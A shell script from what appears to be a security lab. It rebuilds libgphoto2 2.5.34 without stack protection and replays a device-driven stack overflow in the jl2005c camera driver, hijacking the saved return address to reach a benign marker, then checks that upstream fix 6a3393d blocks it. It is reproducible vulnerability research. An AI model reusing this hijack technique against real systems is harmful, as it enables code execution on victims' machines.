#!/bin/sh
# W192: one-command replay of the W191 chosen-saved-RIP result from a clean
# git archive. Run from the archive root (or the repository root):
#
#   git archive HEAD reports/frontier-libgphoto2shell.md lab/frontier/libgphoto2shell \
#     | tar x -C /tmp/replay-w192
#   cd /tmp/replay-w192
#   TARBALL=/path/to/libgphoto2-2.5.34.tar.bz2 \
#     sh lab/frontier/libgphoto2shell/live/replay-clang-control-flow.sh
#
# The tarball is provisioned, not committed: pass TARBALL=/path/to/the/file
# (sha256 pinned below). WORK defaults to /tmp/w192-lgp-replay and is recreated
# on every run. This is an author-side replay of lab rung 4 mechanics, NOT a
# verdict, NOT wire/physical USB and NOT remote command execution.
set -eu

HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
T=$(CDPATH= cd -- "$HERE/.." && pwd)
ROOT=$(CDPATH= cd -- "$HERE/../../../.." && pwd)
TARBALL=${TARBALL:-$T/src/libgphoto2-2.5.34.tar.bz2}
WORK=${WORK:-/tmp/w192-lgp-replay}
TAR_SHA=5df9e774eb4ab6087a193afff84dcafe9f666e3443fe29e73e6779f659ff7f28
VULN_SHA=0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185
OUT=$WORK/replay.out

command -v clang >/dev/null || { echo "clang is required" >&2; exit 2; }
[ -f "$TARBALL" ] || { echo "missing TARBALL=$TARBALL" >&2; exit 2; }
got=$(sha256sum "$TARBALL" | cut -d' ' -f1)
[ "$got" = "$TAR_SHA" ] || { echo "tarball sha256 $got != $TAR_SHA" >&2; exit 2; }

echo "== pins =="
(cd "$ROOT" && sha256sum -c lab/frontier/libgphoto2shell/PINS.sha256)

echo "== clean source and lab patches =="
rm -rf "$WORK"
mkdir -p "$WORK/src" "$WORK/build"
tar xjf "$TARBALL" -C "$WORK/src"
S=$WORK/src/libgphoto2-2.5.34
cd "$S"
patch -p1 < "$T/live/vusb-jl2005.patch" > "$WORK/patch-1.log"
patch -p1 < "$T/evidence/replay-vusb-local-modes.patch" > "$WORK/patch-2.log"
patch -p1 < "$T/evidence/replay-vusb-ret.patch" > "$WORK/patch-3.log"
got=$(sha256sum "$S/camlibs/jl2005c/jl2005c.c" | cut -d' ' -f1)
[ "$got" = "$VULN_SHA" ] || { echo "vulnerable source sha256 $got != $VULN_SHA" >&2; exit 2; }
echo "vulnerable jl2005c.c sha256 $got OK"

echo "== full clang 18 build, no stack canary =="
B=$WORK/build
P=$B/installdir
cd "$B"
CC=clang CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' "$S/configure" \
	--prefix="$P" --with-camlibs=jl2005c --enable-shared --disable-static \
	--without-libxml-2.0 --without-libcurl --without-gdlib \
	--without-libtiff-4 --without-libexif --disable-nls \
	--enable-vusb > "$WORK/configure.log" 2>&1
CC=clang CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' make -j4 > "$WORK/make.log" 2>&1
make install > "$WORK/install.log" 2>&1
[ -f "$P/lib/libgphoto2/2.5.34/jl2005c.so" ] || { echo "camlib not installed" >&2; exit 2; }
echo "jl2005c.so sha256 $(sha256sum "$P/lib/libgphoto2/2.5.34/jl2005c.so" | cut -d' ' -f1)"

echo "== probe =="
PROBE=$WORK/probe
clang -O0 -g -no-pie -I"$P/include" $(pkg-config --cflags glib-2.0) \
	"$T/evidence/replay-clang-control-flow-probe.c" -o "$PROBE" \
	-L"$P/lib" -lgphoto2 -lgphoto2_port $(pkg-config --libs glib-2.0)

: > "$OUT"
run() {
	label=$1; shift
	printf '\n=== %s ===\n' "$label" >> "$OUT"
	set +e
	env CAMLIBS="$P/lib/libgphoto2/2.5.34" \
		IOLIBS="$P/lib/libgphoto2_port/0.12.2" IOLIBS_PREFIX=vusb \
		LD_LIBRARY_PATH="$P/lib" "$@" >> "$OUT" 2>&1
	echo "RC=$?" >> "$OUT"
	set -e
}

# Safe first run also reports the probe's own MARKER address and sink address;
# the attack target is taken from that output, not from a hardcoded constant.
run COUNT100 env -u M2SHELL_JL2005_RET \
	M2SHELL_JL2005_VUSB=p M2SHELL_JL2005_COUNT=100 \
	M2SHELL_JL2005_LEN=0x4000 "$PROBE" usb:001,001 1024 1024
MARKER=$(sed -n 's/^MARKER=\(0x[0-9a-fA-F]*\)$/\1/p' "$OUT" | sed -n 1p)
SINK=$(sed -n 's/^BEFORE SINK=\(0x[0-9a-fA-F]*\).*/\1/p' "$OUT" | sed -n 1p)
[ -n "$MARKER" ] && [ -n "$SINK" ] || { echo "probe did not report MARKER/SINK" >&2; exit 2; }
TOP=$(python3 -c 'import sys;print(hex(int(sys.argv[1],16)+0x30))' "$SINK")
echo "derived MARKER=$MARKER SINK=$SINK TOP=$TOP"

run ATTACK env M2SHELL_JL2005_VUSB=p M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_JL2005_LEN=0x4000 M2SHELL_JL2005_TOP="$TOP" \
	M2SHELL_JL2005_RET="$MARKER" "$PROBE" usb:001,001 1024 1024
run NORET env -u M2SHELL_JL2005_RET \
	M2SHELL_JL2005_VUSB=p M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_JL2005_LEN=0x4000 M2SHELL_JL2005_TOP="$TOP" \
	"$PROBE" usb:001,001 1024 1024

echo "== fixed control: upstream 6a3393d, camlib rebuilt in place =="
cd "$S"
patch -p1 < "$ROOT/lab/frontier/libgphoto2shell/pins/fix-6a3393d.patch" > "$WORK/patch-fix.log"
got=$(sha256sum "$S/camlibs/jl2005c/jl2005c.c" | cut -d' ' -f1)
[ "$got" = 4fdaf4b1bd7a3691fc0a0305566f46a6f5f4f68779784e7358a14c75a8a763a6 ] || \
	{ echo "fixed source sha256 $got mismatch" >&2; exit 2; }
make -C "$B/camlibs" jl2005c.la >> "$WORK/make-fixed.log" 2>&1
make -C "$B/camlibs" install >> "$WORK/install-fixed.log" 2>&1
run FIXED env M2SHELL_JL2005_VUSB=p M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_JL2005_LEN=0x4000 M2SHELL_JL2005_TOP="$TOP" \
	M2SHELL_JL2005_RET="$MARKER" "$PROBE" usb:001,001 1024 1024

echo "== fix reversed, identical attack again =="
cd "$S"
patch -R -p1 < "$ROOT/lab/frontier/libgphoto2shell/pins/fix-6a3393d.patch" > "$WORK/patch-unfix.log"
got=$(sha256sum "$S/camlibs/jl2005c/jl2005c.c" | cut -d' ' -f1)
[ "$got" = "$VULN_SHA" ] || { echo "restore sha256 $got != $VULN_SHA" >&2; exit 2; }
make -C "$B/camlibs" jl2005c.la >> "$WORK/make-restore.log" 2>&1
make -C "$B/camlibs" install >> "$WORK/install-restore.log" 2>&1
run RESTORED env M2SHELL_JL2005_VUSB=p M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_JL2005_LEN=0x4000 M2SHELL_JL2005_TOP="$TOP" \
	M2SHELL_JL2005_RET="$MARKER" "$PROBE" usb:001,001 1024 1024

python3 - "$OUT" <<'PY'
import re, sys
text = open(sys.argv[1]).read()
parts = re.split(r'^=== (.+?) ===$', text, flags=re.M)
cases = {parts[i]: parts[i+1] for i in range(1, len(parts)-1, 2)}
checks = []
def check(name, ok):
    checks.append((name, bool(ok)))
rc = lambda k: re.search(r'^RC=(\d+)$', cases.get(k, ''), re.M)
check('COUNT100 rc=0', rc('COUNT100') and rc('COUNT100').group(1) == '0')
check('COUNT100 no marker', 'M2SHELL_W191_BENIGN_MARKER' not in cases.get('COUNT100', ''))
check('ATTACK marker executed', 'M2SHELL_W191_BENIGN_MARKER' in cases.get('ATTACK', ''))
check('ATTACK rc=42', rc('ATTACK') and rc('ATTACK').group(1) == '42')
m = re.search(r'SIGSEGV SINK=\S+ COUNT_5A=(\d+)', cases.get('NORET', ''))
check('NORET device-chosen write observed', m and int(m.group(1)) > 0)
check('NORET no marker', 'M2SHELL_W191_BENIGN_MARKER' not in cases.get('NORET', ''))
check('NORET rc=139', rc('NORET') and rc('NORET').group(1) == '139')
check('FIXED no marker', 'M2SHELL_W191_BENIGN_MARKER' not in cases.get('FIXED', ''))
check('FIXED rc=0', rc('FIXED') and rc('FIXED').group(1) == '0')
m = re.search(r'AFTER_INIT SINK=\S+ COUNT_5A=(\d+)', cases.get('FIXED', ''))
check('FIXED no device-chosen write', m and int(m.group(1)) == 0)
check('RESTORED marker executed', 'M2SHELL_W191_BENIGN_MARKER' in cases.get('RESTORED', ''))
check('RESTORED rc=42', rc('RESTORED') and rc('RESTORED').group(1) == '42')
for name, ok in checks:
    print(('PASS ' if ok else 'FAIL ') + name)
print('RESULT: %d PASS / %d FAIL' % (sum(o for _, o in checks), sum(not o for _, o in checks)))
sys.exit(0 if all(o for _, o in checks) else 1)
PY
